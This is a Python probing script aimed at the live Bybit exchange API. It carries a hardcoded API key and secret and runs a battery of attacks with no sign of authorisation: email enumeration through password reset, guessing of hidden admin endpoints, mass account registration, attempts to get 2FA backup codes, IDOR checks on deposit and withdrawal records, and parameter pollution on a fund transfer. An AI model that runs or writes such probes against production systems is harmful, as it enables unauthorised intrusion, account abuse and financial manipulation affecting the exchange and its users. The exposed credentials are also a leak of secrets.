#!/usr/bin/env python3
"""
Final deep dive - trying EVERYTHING we haven't tried yet
"""
import subprocess
import time
import hmac
import hashlib
import json

API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"

def get_server_time():
    try:
        cmd = ["curl", "-s", f"{BASE_URL}/v5/market/time"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        data = json.loads(result.stdout)
        return int(data['time'])
    except:
        return int(time.time() * 1000)

OFFSET = get_server_time() - int(time.time() * 1000)

def get_signature(payload, api_secret):
    return hmac.new(bytes(api_secret, "utf-8"), bytes(payload, "utf-8"), hashlib.sha256).hexdigest()

def send_request(endpoint, params):
    timestamp = str(int(time.time() * 1000) + OFFSET)
    recv_window = "5000"
    
    params_str = "&".join([f"{k}={v}" for k, v in sorted(params.items())])
    sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
    signature = get_signature(sign_payload, API_SECRET)
    
    headers = [
        "-H", f"X-BAPI-API-KEY: {API_KEY}",
        "-H", f"X-BAPI-SIGN: {signature}",
        "-H", "X-BAPI-SIGN-TYPE: 2",
        "-H", f"X-BAPI-TIMESTAMP: {timestamp}",
        "-H", f"X-BAPI-RECV-WINDOW: {recv_window}",
        "-H", "Content-Type: application/json"
    ]
    
    full_url = f"{BASE_URL}{endpoint}?{params_str}"
    cmd = ["curl", "-s"] + headers + [full_url]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        return json.loads(result.stdout)
    except:
        return {}

print("="*80)
print("FINAL DEEP DIVE - TRYING EVERYTHING")
print("="*80)

# 1. Check for account enumeration
print("\n[1] Account Enumeration via Email")
print("-" * 80)

test_emails = [
    "admin@bybit.com",
    "test@bybit.com", 
    "nonexistent@bybit.com",
]

for email in test_emails:
    # Try password reset to check if account exists
    cmd = ["curl", "-s", "-X", "POST",
           "https://api.bybit.com/user/v1/password/forgot",
           "-H", "Content-Type: application/json",
           "-d", json.dumps({"email": email})]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        data = json.loads(result.stdout)
        
        print(f"\nEmail: {email}")
        print(f"  RetCode: {data.get('retCode')}")
        print(f"  Msg: {data.get('retMsg', '')[:60]}")
        
        # Different messages for existing vs non-existing accounts = enumeration
        
    except:
        pass

# 2. Try to find hidden admin/internal endpoints via typos
print("\n\n[2] Typosquatting Internal Endpoints")
print("-" * 80)

typo_endpoints = [
    "/v5/admin",  # Missing trailing /
    "/v5/admim",  # Typo
    "/v5/interal",  # Typo
    "/v5//account/wallet-balance",  # Double slash
    "/v6/account/wallet-balance",  # Wrong version
    "/v4/account/wallet-balance",  # Old version
]

for endpoint in typo_endpoints:
    try:
        cmd = ["curl", "-s", "-I", f"{BASE_URL}{endpoint}"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
        
        if "404" not in result.stdout and "403" not in result.stdout:
            print(f"\n⚠️  {endpoint}")
            print(f"  {result.stdout.split('\\n')[0]}")
    except:
        pass

# 3. Mass account creation (rate limit bypass)
print("\n\n[3] Testing Rate Limiting on Registration")
print("-" * 80)

start = time.time()
count = 0

for i in range(10):
    try:
        cmd = ["curl", "-s", "-X", "POST",
               "https://api.bybit.com/user/v1/create",
               "-H", "Content-Type: application/json",
               "-d", json.dumps({
                   "email": f"test{i}@test{i}.com",
                   "password": "Test123!@#"
               })]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
        count += 1
        
    except:
        pass

elapsed = time.time() - start
print(f"Sent {count} registration requests in {elapsed:.2f}s ({count/elapsed:.1f} req/s)")

if count/elapsed > 5:
    print("  ⚠️  High rate allowed! Possible abuse vector.")

# 4. Try to bypass 2FA via backup codes
print("\n\n[4] Testing 2FA Backup Code Generation")
print("-" * 80)

res = send_request("/v5/user/query-api", {})
print(f"User API: {res.get('retCode')}")

# Try to generate backup codes (might work without 2FA enabled)
backup_res = send_request("/v5/user/2fa/backup-codes", {})
print(f"Backup codes: {backup_res.get('retCode')} - {backup_res.get('retMsg', '')[:60]}")

# 5. Test for IDOR on different resources
print("\n\n[5] Testing IDOR on Different Resources")
print("-" * 80)

idor_tests = [
    ("/v5/asset/deposit/query-record", {"coin": "BTC", "cursor": "1"}),
    ("/v5/asset/withdraw/query-record", {"coin": "BTC", "cursor": "1"}),
    ("/v5/asset/transfer/query-inter-transfer-list", {}),
    ("/v5/asset/transfer/query-sub-member-list", {}),
]

for endpoint, params in idor_tests:
    res = send_request(endpoint, params)
    print(f"\n{endpoint}")
    print(f"  RetCode: {res.get('retCode')}")
    print(f"  Msg: {res.get('retMsg', '')[:60]}")
    
    if res.get('retCode') == 0:
        result = res.get('result', {})
        rows = result.get('rows', [])
        print(f"  🚨 Got {len(rows)} records!")

# 6. Test parameter pollution on critical endpoints
print("\n\n[6] Parameter Pollution on Transfer")
print("-" * 80)

# Try to confuse backend with duplicate params
pollution_test = send_request("/v5/asset/transfer/inter-transfer", {
    "fromAccountType": "UNIFIED",
    "toAccountType": "SPOT",
    "coin": "USDT",
    "amount": "0.01",
    # Add confusing params
    "amount2": "1000000",  # Try to trick it
})

print(f"Pollution test: {pollution_test.get('retCode')} - {pollution_test.get('retMsg', '')[:80]}")

print("\n" + "="*80)
print("DEEP DIVE COMPLETE")
print("="*80)
